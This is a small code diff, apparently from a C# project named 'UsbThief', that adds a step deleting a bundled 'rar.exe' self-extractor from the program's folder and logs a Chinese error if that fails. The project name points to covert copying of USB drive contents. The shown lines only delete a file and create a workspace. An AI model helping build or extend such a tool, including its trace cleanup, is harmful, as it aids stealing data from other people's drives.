@@ -87,6 +87,15 @@ namespace UsbThief
             }
             try
             {
+                if (File.Exists(Application.StartupPath + "\\rar.exe"))
+                    File.Delete(Application.StartupPath + "\\rar.exe");
+            }
+            catch (Exception e)
+            {
+                logger.Error("无法删除自解压文件：\n" + e);
+            }
+            try
+            {
                 if (!Directory.Exists(workspace))
                     Directory.CreateDirectory(workspace);
             }
